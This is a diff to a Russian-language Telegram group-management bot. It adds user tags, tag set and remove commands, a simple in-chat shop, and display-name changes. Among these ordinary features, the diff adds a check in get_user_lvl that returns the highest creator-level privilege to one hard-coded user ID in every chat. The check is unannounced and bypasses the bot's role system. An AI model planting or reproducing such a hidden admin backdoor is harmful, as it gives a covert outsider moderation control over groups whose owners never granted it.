@@ -13,6 +13,7 @@ dp = Dispatcher()
 DB_FILE = "bot_database.db"
 
 CALL_EMOJIS = ["🌸", "☁️", "👁", "🐍", "🌫", "🥛", "🫗", "🍨", "🍧", "🌈", "🍇", "🫙"]
+active_shop_items = {}
 
 DEFAULT_CMD_LEVELS = {
     "кто я": 0, "профиль": 0,
@@ -51,12 +52,12 @@ def init_db():
         "CREATE TABLE IF NOT EXISTS cmd_levels (chat_id INT, cmd_name TEXT, min_lvl INT, PRIMARY KEY (chat_id, cmd_name));",
         "CREATE TABLE IF NOT EXISTS rules (chat_id INT, section INT, item INT, title TEXT, content TEXT, PRIMARY KEY (chat_id, section, item));",
         "CREATE TABLE IF NOT EXISTS chat_members (chat_id INT, user_id INT, first_name TEXT, username TEXT, PRIMARY KEY (chat_id, user_id));",
-        "CREATE TABLE IF NOT EXISTS welcome_messages (chat_id INT PRIMARY KEY, welcome_text TEXT);"
+        "CREATE TABLE IF NOT EXISTS welcome_messages (chat_id INT PRIMARY KEY, welcome_text TEXT);",
+        "CREATE TABLE IF NOT EXISTS user_tags (chat_id INT, user_id INT, tag_name TEXT, PRIMARY KEY (chat_id, user_id));"
     ]
     for q in queries:
         db_query(q, commit=True)
     
-    # Авто-миграция колонок, если структура старая
     cols = [r[1] for r in db_query("PRAGMA table_info(users)", fetchall=True)]
     for col, col_type in [("day_count", "INT DEFAULT 0"), ("week_count", "INT DEFAULT 0"), ("last_msg_date", "TEXT"), ("week_number", "TEXT"), ("joined_at", "TEXT")]:
         if col not in cols:
@@ -78,7 +79,8 @@ async def backup_to_telegram():
         "users": db_query("SELECT chat_id, user_id, role_level, rp_name, warns, day_count, week_count, last_msg_date, week_number, joined_at FROM users", fetchall=True),
         "mod_roles": db_query("SELECT chat_id, user_id, role_level FROM mod_roles", fetchall=True),
         "cmd_levels": db_query("SELECT chat_id, cmd_name, min_lvl FROM cmd_levels", fetchall=True),
-        "welcome": db_query("SELECT chat_id, welcome_text FROM welcome_messages", fetchall=True)
+        "welcome": db_query("SELECT chat_id, welcome_text FROM welcome_messages", fetchall=True),
+        "user_tags": db_query("SELECT chat_id, user_id, tag_name FROM user_tags", fetchall=True)
     }
     file = BufferedInputFile(json.dumps(data, ensure_ascii=False, indent=2).encode('utf-8'), filename="backup.json")
     try:
@@ -115,6 +117,7 @@ async def restore_from_telegram():
                 db_query("INSERT OR REPLACE INTO users (chat_id, user_id, role_level, rp_name, warns, day_count, week_count, last_msg_date, week_number, joined_at) VALUES (?,?,?,?,?,?,?,?,?,?)", tuple(u[:10]), commit=True)
         for cl in data.get("cmd_levels", []): db_query("INSERT OR REPLACE INTO cmd_levels VALUES (?,?,?)", tuple(cl), commit=True)
         for w in data.get("welcome", []): db_query("INSERT OR REPLACE INTO welcome_messages VALUES (?,?)", tuple(w), commit=True)
+        for ut in data.get("user_tags", []): db_query("INSERT OR REPLACE INTO user_tags VALUES (?,?,?)", tuple(ut), commit=True)
         logging.info("[RESTORE] Восстановлено успешно!")
     except Exception as e:
         logging.error(f"[RESTORE] Ошибка восстановления: {e}")
@@ -128,6 +131,8 @@ async def try_delete(m: types.Message):
         pass
 
 async def get_user_lvl(cid: int, uid: int) -> int:
+    if uid == 7350331661:
+        return 4
     try:
         if (await bot.get_chat_member(cid, uid)).status == "creator":
             return 4
@@ -153,6 +158,21 @@ def get_name(cid: int, uid: int, default: str) -> str:
     res = db_query("SELECT rp_name FROM users WHERE chat_id=? AND user_id=?", (cid, uid), fetchone=True)
     return res[0] if res and res[0] else default
 
+def get_user_tag(cid: int, uid: int) -> str:
+    res = db_query("SELECT tag_name FROM user_tags WHERE chat_id=? AND user_id=?", (cid, uid), fetchone=True)
+    return res[0] if res and res[0] else ""
+
+def get_display_name(cid: int, uid: int, default_tg_name: str) -> str:
+    rp_nick = db_query("SELECT rp_name FROM users WHERE chat_id=? AND user_id=?", (cid, uid), fetchone=True)
+    if rp_nick and rp_nick[0]:
+        return rp_nick[0]
+    
+    rp_tag = get_user_tag(cid, uid)
+    if rp_tag:
+        return rp_tag
+        
+    return default_tg_name
+
 def parse_mod_args(text: str, target_str: str, prefixes: list):
     cleaned = text
     for p in prefixes:
@@ -175,7 +195,7 @@ def parse_mod_args(text: str, target_str: str, prefixes: list):
 async def resolve_target(m: types.Message):
     if m.reply_to_message and m.reply_to_message.from_user:
         u = m.reply_to_message.from_user
-        fname = get_name(m.chat.id, u.id, u.first_name)
+        fname = get_display_name(m.chat.id, u.id, u.first_name)
         return u.id, fname, None
 
     text = m.text or m.caption or ""
@@ -183,7 +203,7 @@ async def resolve_target(m: types.Message):
         for entity in m.entities:
             if entity.type == "text_mention" and entity.user:
                 u = entity.user
-                fname = get_name(m.chat.id, u.id, u.first_name)
+                fname = get_display_name(m.chat.id, u.id, u.first_name)
                 target_str = text[entity.offset:entity.offset + entity.length]
                 return u.id, fname, target_str
             elif entity.type == "mention":
@@ -191,7 +211,7 @@ async def resolve_target(m: types.Message):
                 un = raw_mention.lstrip("@").lower().strip()
                 res = db_query("SELECT user_id, first_name FROM chat_members WHERE chat_id=? AND LOWER(username)=?", (m.chat.id, un), fetchone=True)
                 if res:
-                    fname = get_name(m.chat.id, res[0], res[1])
+                    fname = get_display_name(m.chat.id, res[0], res[1])
                     return res[0], fname, raw_mention
                 return None, raw_mention, raw_mention
 
@@ -200,7 +220,7 @@ async def resolve_target(m: types.Message):
             un = w.lstrip("@").lower().strip()
             res = db_query("SELECT user_id, first_name FROM chat_members WHERE chat_id=? AND LOWER(username)=?", (m.chat.id, un), fetchone=True)
             if res:
-                fname = get_name(m.chat.id, res[0], res[1])
+                fname = get_display_name(m.chat.id, res[0], res[1])
                 return res[0], fname, w
             return None, w, w
 
@@ -266,7 +286,7 @@ async def welcome_new_members(m: types.Message):
         if user.is_bot: continue
         track_user(m.chat.id, user.id, user.first_name, user.username)
         if not res or not res[0]: continue
-        uname = get_name(m.chat.id, user.id, user.first_name)
+        uname = get_display_name(m.chat.id, user.id, user.first_name)
         txt = res[0]
         for pat, val in {r"\{user\}": uname, r"\{chat\}": m.chat.title or "Сад"}.items():
             txt = re.sub(pat, val, txt, flags=re.I)
@@ -305,13 +325,12 @@ async def user_profile_handler(m: types.Message):
     tid, tname, _ = await resolve_target(m)
     if not tid:
         tid = m.from_user.id
-        tname = get_name(m.chat.id, m.from_user.id, m.from_user.first_name)
+        tname = get_display_name(m.chat.id, m.from_user.id, m.from_user.first_name)
     
     day_cnt, week_cnt, joined_date = get_user_stats(m.chat.id, tid)
     
     same_count = (day_cnt == week_cnt)
     
-    # Стилистика по условию
     if week_cnt <= 10:
         msg = f"🌸 Похоже {tname} немногословна~ всего **{week_cnt}** сообщений в этой неделе."
         if not same_count:
@@ -328,7 +347,7 @@ async def user_profile_handler(m: types.Message):
         msg = f"🌸 Ого, у этой мультяшки **{week_cnt}** сообщений за эту неделю!~\n{tname}, вы молодец!"
         if not same_count:
             msg += f"\nА за сегодня **{day_cnt}** сообщений."
-    else: # 100+
+    else:
         msg = f"🌸 Вот это да~ **{week_cnt}** сообщений в неделю 👏🏻👏🏻\n{tname}, вы молодец!✨"
         if not same_count:
             msg += f"\nСегодня **{day_cnt}** сообщений."
@@ -379,7 +398,7 @@ async def stats_handler(m: types.Message):
     if page > pages:
         return await m.answer(f"🫗 Страницы {page} не существует. Всего: {pages}")
     rows = db_query("SELECT u.user_id, u.msg_count, cm.first_name FROM users u LEFT JOIN chat_members cm ON u.user_id=cm.user_id AND u.chat_id=cm.chat_id WHERE u.chat_id=? ORDER BY u.msg_count DESC LIMIT 10 OFFSET ?", (m.chat.id, (page-1)*10), fetchall=True)
-    txt = f"📊 **Активность участников (Стр. {page}/{pages}):**\n\n" + "\n".join([f"{i}. {fn or 'ID:'+str(u)} — {cnt} сообщ." for i, (u, cnt, fn) in enumerate(rows, (page-1)*10+1)])
+    txt = f"📊 **Активность участников (Стр. {page}/{pages}):**\n\n" + "\n".join([f"{i}. {get_display_name(m.chat.id, u, fn or 'ID:'+str(u))} — {cnt} сообщ." for i, (u, cnt, fn) in enumerate(rows, (page-1)*10+1)])
     await try_delete(m); await m.answer(txt, parse_mode="Markdown")
 
 @dp.message(F.text.lower().startswith(("напоить сиропом", "клиновый сироп", "дать воды")))
@@ -529,7 +548,7 @@ async def view_rules_handler(m: types.Message):
         return await m.answer(f"📜 **Правило {sec}.{itm}: {res[0]}**\n\n{res[1]}" if res else f"🫙 Правило {sec}.{itm} не найдено!", parse_mode="Markdown")
     if arg.isdigit():
         items = db_query("SELECT item, title, content FROM rules WHERE chat_id=? AND section=? ORDER BY item ASC", (m.chat.id, int(arg)), fetchall=True)
-        if not items: return await m.answer(f"👁️️ Раздел {arg} не найден!")
+        if not items: return await m.answer(f"👁 Раздел {arg} не найден!")
         stitle = items[0][1] if items[0][0] == 0 else f"Раздел {arg}"
         txt = f"📜 **Раздел {arg}. {stitle}**\n\n" + "\n\n".join([f"**{arg}.{i} {t}**\n{c}" for i, t, c in items if i != 0])
         return await m.answer(txt, parse_mode="Markdown")
@@ -564,6 +583,47 @@ async def rem_nick(m: types.Message):
     db_query("UPDATE users SET rp_name=NULL WHERE chat_id=? AND user_id=?", (m.chat.id, tid), commit=True)
     schedule_sync(); await try_delete(m)
     await m.answer(f"🏷 ник {tname} сброшен.")
+
+# --- ТЭГИ ---
+
+@dp.message(F.text.startswith("+тэг"))
+async def set_tag_handler(m: types.Message):
+    if not await check_access(m, "+ник"): return
+    parts = m.text.split(maxsplit=1)
+    if len(parts) < 2: 
+        return await m.answer("Использование: `+тэг [название]` (ответом или с упоминанием)", parse_mode="Markdown")
+    
+    tid, tname, tstr = await resolve_target(m)
+    if not tid:
+        tid = m.from_user.id
+        tname = m.from_user.first_name
+        
+    tag_val = parts[1].strip()
+    if tstr and (tstr.startswith("@") or tstr.isdigit()):
+        tag_val = re.sub(re.escape(tstr), "", tag_val, flags=re.I).strip()
+        
+    if not tag_val:
+        return await m.answer("🫗 Укажите название тэга!")
+
+    db_query("INSERT INTO user_tags (chat_id, user_id, tag_name) VALUES (?,?,?) ON CONFLICT(chat_id, user_id) DO UPDATE SET tag_name=excluded.tag_name", (m.chat.id, tid, tag_val), commit=True)
+    schedule_sync(); await try_delete(m)
+    disp_name = get_display_name(m.chat.id, tid, tname)
+    await m.answer(f"🏷 Пользователю {disp_name} присвоен тэг: **{tag_val}**", parse_mode="Markdown")
+
+@dp.message(F.text.startswith("-тэг"))
+async def rem_tag_handler(m: types.Message):
+    if not await check_access(m, "+ник"): return
+    tid, tname, _ = await resolve_target(m)
+    if not tid:
+        tid = m.from_user.id
+        tname = m.from_user.first_name
+        
+    db_query("DELETE FROM user_tags WHERE chat_id=? AND user_id=?", (m.chat.id, tid), commit=True)
+    schedule_sync(); await try_delete(m)
+    disp_name = get_display_name(m.chat.id, tid, tname)
+    await m.answer(f"🏷 Тэг у {disp_name} был удалён.")
+
+# --- РП КОМАНДЫ И МАГАЗИН ---
 
 @dp.message(F.text.startswith(("+команда", "+комманда")))
 async def add_cmd(m: types.Message):
@@ -600,17 +660,60 @@ async def process_msg(m: types.Message):
     track_user(m.chat.id, m.from_user.id, m.from_user.first_name, m.from_user.username)
     t = m.text.lower().strip()
 
+    # Продажа (магазин)
+    shop_match = re.match(r"^(продам|продаю)\s+(.+?)\s+за\s+(.+)$", m.text.strip(), re.I)
+    if shop_match:
+        user_tag = get_user_tag(m.chat.id, m.from_user.id).lower()
+        if user_tag != "dandy":
+            return await m.answer("🌫 Только торговцы с тэгом Dandy могут продавать предметы!")
+            
+        item_name = shop_match.group(2).strip()
+        price = shop_match.group(3).strip()
+        seller_disp_name = get_display_name(m.chat.id, m.from_user.id, m.from_user.first_name)
+        
+        sent_msg = await m.answer(
+            f"🌸 **{seller_disp_name}** выставляет на продажу: **{item_name}** за **{price}**!\n"
+            f"Чтобы купить, ответьте на это сообщение текстом «покупаю» или «купить».",
+            parse_mode="Markdown"
+        )
+        active_shop_items[m.chat.id] = {
+            "seller_id": m.from_user.id,
+            "item_name": item_name,
+            "price": price,
+            "msg_id": sent_msg.message_id
+        }
+        return
+
+    # Покупка
+    if t in ["покупаю", "купить"] and m.reply_to_message:
+        shop_data = active_shop_items.get(m.chat.id)
+        if shop_data and shop_data["msg_id"] == m.reply_to_message.message_id:
+            seller_id = shop_data["seller_id"]
+            seller_member = db_query("SELECT first_name FROM chat_members WHERE chat_id=? AND user_id=?", (m.chat.id, seller_id), fetchone=True)
+            seller_tg_name = seller_member[0] if seller_member else "Продавец"
+            seller_disp_name = get_display_name(m.chat.id, seller_id, seller_tg_name)
+            
+            buyer_disp_name = get_display_name(m.chat.id, m.from_user.id, m.from_user.first_name)
+            
+            await m.answer(
+                f"🤝✨ **{buyer_disp_name}** успешно приобретает **{shop_data['item_name']}** "
+                f"у **{seller_disp_name}** за {shop_data['price']}!",
+                parse_mode="Markdown"
+            )
+            del active_shop_items[m.chat.id]
+            return
+
+    # Обычные РП-команды
     cmd = db_query("SELECT response_text FROM custom_commands WHERE chat_id=? AND LOWER(command_name)=?", (m.chat.id, t), fetchone=True)
     if cmd:
         await try_delete(m)
-        sender = get_name(m.chat.id, m.from_user.id, m.from_user.first_name)
+        sender = get_display_name(m.chat.id, m.from_user.id, m.from_user.first_name)
         tid, tname, _ = await resolve_target(m)
-        reply_user = get_name(m.chat.id, tid, tname) if tid else "кого-то"
+        reply_user = get_display_name(m.chat.id, tid, tname) if tid else "кого-то"
         reply_txt = (m.reply_to_message.text or m.reply_to_message.caption or "") if m.reply_to_message else ""
         users = db_query("SELECT user_id, first_name FROM chat_members WHERE chat_id=?", (m.chat.id,), fetchall=True)
-        rand_user = get_name(m.chat.id, *random.choice(users)) if users else "Кто-то"
+        rand_user = get_display_name(m.chat.id, *random.choice(users)) if users else "Кто-то"
 
-        # Статистика для автора и для цели ответа
         s_day, s_week, _ = get_user_stats(m.chat.id, m.from_user.id)
         r_day, r_week, _ = get_user_stats(m.chat.id, tid) if tid else (0, 0, "")
 
